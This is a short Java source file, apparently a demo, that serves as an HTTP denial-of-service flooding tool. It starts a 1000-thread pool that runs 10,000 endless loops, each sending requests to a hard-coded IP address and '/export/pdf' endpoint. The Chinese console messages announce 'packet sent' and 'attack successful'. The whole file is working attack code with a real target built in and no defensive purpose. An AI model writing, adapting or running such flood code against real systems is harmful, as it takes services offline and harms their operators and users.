package org.wys.demo.http.ddos;

import java.io.BufferedInputStream;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * @author wys
 * @date 2021/9/7
 */
public class Ddos {

    public void testDdos() {
        //利用线程池创建1000个线程
        ExecutorService es = Executors.newFixedThreadPool(1000);
        MyThread mythread = new MyThread();
        Thread thread = new Thread(mythread);
        for (int i = 0; i < 10000; i++) {
            es.execute(thread);
        }
    }
    static class MyThread implements Runnable {
        public void run() {
            while (true) {
                try {
                    URL url = new URL("http://30.43.48.249:8888/export/pdf");
                    URLConnection conn = url.openConnection();
                    System.out.println("发包成功！");
                    BufferedInputStream bis = new BufferedInputStream(
                            conn.getInputStream());
                    byte[] bytes = new byte[1024];
                    int len = -1;
                    StringBuffer sb = new StringBuffer();

                    if ((len = bis.read()) != -1) {
                        sb.append(new String(bytes, 0, len));
                        System.out.println("攻击成功！");
                        bis.close();
                    }
                } catch (MalformedURLException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                } catch (IOException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }
            }
        }
    }
}